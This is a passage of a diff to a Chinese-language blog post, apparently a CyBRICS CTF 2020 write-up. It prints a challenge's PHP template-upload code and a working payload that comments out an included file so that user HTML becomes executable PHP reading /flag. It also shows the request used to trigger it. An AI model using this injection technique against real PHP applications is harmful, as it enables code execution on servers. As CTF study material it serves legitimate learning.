class="line">$error = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'html'</span>])) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $html = trim($_POST[<span class="string">'html'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (strpos($html, <span class="string">'&lt;?'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            $error = <span class="string">"Bad chars"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $requiredBlocks = [</span><br><span class="line">            <span class="string">'id="back"'</span>,</span><br><span class="line">            <span class="string">'id="field" name="field"'</span>,</span><br><span class="line">            <span class="string">'id="digit0"'</span>,</span><br><span class="line">            <span class="string">'id="digit1"'</span>,</span><br><span class="line">            <span class="string">'id="digit2"'</span>,</span><br><span class="line">            <span class="string">'id="digit3"'</span>,</span><br><span class="line">            <span class="string">'id="digit4"'</span>,</span><br><span class="line">            <span class="string">'id="digit5"'</span>,</span><br><span class="line">            <span class="string">'id="digit6"'</span>,</span><br><span class="line">            <span class="string">'id="digit7"'</span>,</span><br><span class="line">            <span class="string">'id="digit8"'</span>,</span><br><span class="line">            <span class="string">'id="digit9"'</span>,</span><br><span class="line">            <span class="string">'id="plus"'</span>,</span><br><span class="line">            <span class="string">'id="equals"'</span>,</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> ($requiredBlocks <span class="keyword">as</span> $block) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos($html, $block) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                $error = <span class="string">"Missing required block: '$block'"</span>;</span><br><span class="line">                <span class="keyword">break</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $uuid = uuid();</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="string">"calcs/$userid/templates/$uuid.html"</span>, $html)) &#123;</span><br><span class="line">            $error = <span class="string">"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        redir(<span class="string">"."</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">      &lt;div class="row"&gt;</span><br><span class="line">        &lt;div class="p-5 mx-auto col-10 col-md-10 bg-info"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($error) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">          &lt;div class="alert alert-danger" role="alert"&gt;</span><br><span class="line">            &lt;button type="button" class="close" data-dismiss="alert"&gt;×&lt;/button&gt;</span><br><span class="line">            &lt;h4 class="alert-heading"&gt;Error&lt;/h4&gt;</span><br><span class="line">            &lt;p class="mb-0"&gt;&lt;?=htmlspecialchars($error)?&gt;&lt;/p&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">          &lt;h3 class="display-3"&gt;New template&lt;/h3&gt;</span><br><span class="line">          &lt;div class="px-4 order-1 order-md-2 col-lg-12"&gt;</span><br><span class="line">            &lt;h2 class="mb-4"&gt;Insert code&lt;/h2&gt;</span><br><span class="line">            &lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">              &lt;div class="form-group"&gt; &lt;textarea style="min-height: 100px; font-family: 'Fira Code', Consolas, monospace;" placeholder="HTML" class="form-control form-control-sm" name="html" oninput="this.style.height = ''; this.style.height = (this.scrollHeight + 10) +'px'"&gt;&lt;?=htmlspecialchars(@$_POST['html'])?&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-lg btn-outline-secondary mx-3 px-3"&gt;&lt;i class="fa fa-plus-square fa-fw fa-1x py-1"&gt;&lt;/i&gt; Create Template&lt;/button&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+if (!@$_SESSION[&#39;userid&#39;]) {
+    redir(&quot;.&quot;);
+}
+
+$userid = $_SESSION[&#39;userid&#39;];
+
+$error = false;
+
+if (trim(@$_POST[&#39;html&#39;])) {
+    do {
+        $html = trim($_POST[&#39;html&#39;]);
+        if (strpos($html, &#39;&lt;?&#39;) !== false) {
+            $error = &quot;Bad chars&quot;;
+            break;
+        }
+
+        $requiredBlocks = [
+            &#39;id=&quot;back&quot;&#39;,
+            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
+            &#39;id=&quot;digit0&quot;&#39;,
+            &#39;id=&quot;digit1&quot;&#39;,
+            &#39;id=&quot;digit2&quot;&#39;,
+            &#39;id=&quot;digit3&quot;&#39;,
+            &#39;id=&quot;digit4&quot;&#39;,
+            &#39;id=&quot;digit5&quot;&#39;,
+            &#39;id=&quot;digit6&quot;&#39;,
+            &#39;id=&quot;digit7&quot;&#39;,
+            &#39;id=&quot;digit8&quot;&#39;,
+            &#39;id=&quot;digit9&quot;&#39;,
+            &#39;id=&quot;plus&quot;&#39;,
+            &#39;id=&quot;equals&quot;&#39;,
+        ];
+
+        foreach ($requiredBlocks as $block) {
+            if (strpos($html, $block) === false) {
+                $error = &quot;Missing required block: &#39;$block&#39;&quot;;
+                break(2);
+            }
+        }
+
+        $uuid = uuid();
+        if (!file_put_contents(&quot;calcs/$userid/templates/$uuid.html&quot;, $html)) {
+            $error = &quot;Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts&quot;;
+            break;
+        }
+
+        redir(&quot;.&quot;);
+    } while (false);
+}
+?&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;p-5 mx-auto col-10 col-md-10 bg-info&quot;&gt;
+&lt;?php
+if ($error) {
+?&gt;
+          &lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;
+            &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;×&lt;/button&gt;
+            &lt;h4 class=&quot;alert-heading&quot;&gt;Error&lt;/h4&gt;
+            &lt;p class=&quot;mb-0&quot;&gt;&lt;?=htmlspecialchars($error)?&gt;&lt;/p&gt;
+          &lt;/div&gt;
+&lt;?php
+}
+?&gt;
+          &lt;h3 class=&quot;display-3&quot;&gt;New template&lt;/h3&gt;
+          &lt;div class=&quot;px-4 order-1 order-md-2 col-lg-12&quot;&gt;
+            &lt;h2 class=&quot;mb-4&quot;&gt;Insert code&lt;/h2&gt;
+            &lt;form method=&quot;POST&quot;&gt;
+              &lt;div class=&quot;form-group&quot;&gt; &lt;textarea style=&quot;min-height: 100px; font-family: &#39;Fira Code&#39;, Consolas, monospace;&quot; placeholder=&quot;HTML&quot; class=&quot;form-control form-control-sm&quot; name=&quot;html&quot; oninput=&quot;this.style.height = &#39;&#39;; this.style.height = (this.scrollHeight + 10) +&#39;px&#39;&quot;&gt;&lt;?=htmlspecialchars(@$_POST[&#39;html&#39;])?&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-lg btn-outline-secondary mx-3 px-3&quot;&gt;&lt;i class=&quot;fa fa-plus-square fa-fw fa-1x py-1&quot;&gt;&lt;/i&gt; Create Template&lt;/button&gt;
+            &lt;/form&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;</code></pre>
 <p>然后我们发现。calc.php如果不传递share参数的话。将只是简单的require我们的template.但是倘若传递share.则将进行一个拼接。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">    $calc = uuid();</span><br><span class="line">    file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">    redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if (@$_POST[&#39;share&#39;]) {
+    $calc = uuid();
+    file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));
+    redir(&quot;?p=sharelink&amp;calc=$calc&quot;);
+}</code></pre>
 <p>我们的变量field与之后的<code>inc/calclib.html</code>，以及自己的template进行拼接。当内容作为file_put_contents的参数写进新的php文件时。<code>&lt;?=</code>总是可用的(即作为echo 调用)那么我们只需要想办法解决掉中间拼接的文件<code>inc/calclib.html</code>即可。通过使用注释符将两者中间的html文件注释掉，并在template中写入恶意代码就能完成</p>
 <p><img src="/2020/07/26/CyBRICS-CTF-2020/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>本地模拟写入的文件。可以看到中间的部分被注释掉。我们只需注意正确闭合括号。<br>payload<br>html内容</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"field"</span> <span class="attr">name</span>=<span class="string">"field"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit0"</span> <span class="attr">data-append</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit1"</span> <span class="attr">data-append</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit2"</span> <span class="attr">data-append</span>=<span class="string">"2"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit3"</span> <span class="attr">data-append</span>=<span class="string">"3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit4"</span> <span class="attr">data-append</span>=<span class="string">"4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit5"</span> <span class="attr">data-append</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit6"</span> <span class="attr">data-append</span>=<span class="string">"6"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit7"</span> <span class="attr">data-append</span>=<span class="string">"7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit8"</span> <span class="attr">data-append</span>=<span class="string">"8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"digit9"</span> <span class="attr">data-append</span>=<span class="string">"9"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"plus"</span> <span class="attr">data-append</span>=<span class="string">" + "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"minus"</span> <span class="attr">data-append</span>=<span class="string">" - "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"times"</span> <span class="attr">data-append</span>=<span class="string">" * "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"div"</span> <span class="attr">data-append</span>=<span class="string">" / "</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"point"</span> <span class="attr">data-append</span>=<span class="string">"."</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"clear"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"back"</span> <span class="attr">value</span>=<span class="string">"← Back"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"share"</span> <span class="attr">name</span>=<span class="string">"share"</span> <span class="attr">value</span>=<span class="string">"Share"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"equals"</span> /&gt;</span></span><br><span class="line">*/readfile("/flag")));</span><br></pre></td></tr></table></figure>
+<pre><code class="html">&lt;html&gt;
+&lt;body&gt;
+&lt;input type=&quot;text&quot; class=&quot;part&quot; id=&quot;field&quot; name=&quot;field&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit0&quot; data-append=&quot;0&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit1&quot; data-append=&quot;1&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit2&quot; data-append=&quot;2&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit3&quot; data-append=&quot;3&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit4&quot; data-append=&quot;4&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit5&quot; data-append=&quot;5&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit6&quot; data-append=&quot;6&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit7&quot; data-append=&quot;7&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit8&quot; data-append=&quot;8&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit9&quot; data-append=&quot;9&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;plus&quot; data-append=&quot; + &quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;minus&quot; data-append=&quot; - &quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;times&quot; data-append=&quot; * &quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;div&quot; data-append=&quot; / &quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;point&quot; data-append=&quot;.&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;clear&quot; /&gt;
+&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;back&quot; value=&quot;← Back&quot; /&gt;
+&lt;input type=&quot;submit&quot; class=&quot;part&quot; id=&quot;share&quot; name=&quot;share&quot; value=&quot;Share&quot; /&gt;
+&lt;input type=&quot;submit&quot; class=&quot;part&quot; id=&quot;equals&quot; /&gt;
+*/readfile(&quot;/flag&quot;)));</code></pre>
 <p>之后来到calc.php传值<code>field=/*&amp;share=1</code>即可在重定向后得到写入shell的地址。<br>远程getflag<br><img src="/2020/07/26/CyBRICS-CTF-2020/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>题目比较有意思。体验不错。在这之前的一场3kCTF因为时间原因写不了wp了,题目质量倒是挺好的。下周开始hw就不更文章</p>
 
@@ -702,7 +955,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -714,9 +967,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -849,6 +1102,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1062,7 +1317,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1118,6 +1373,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
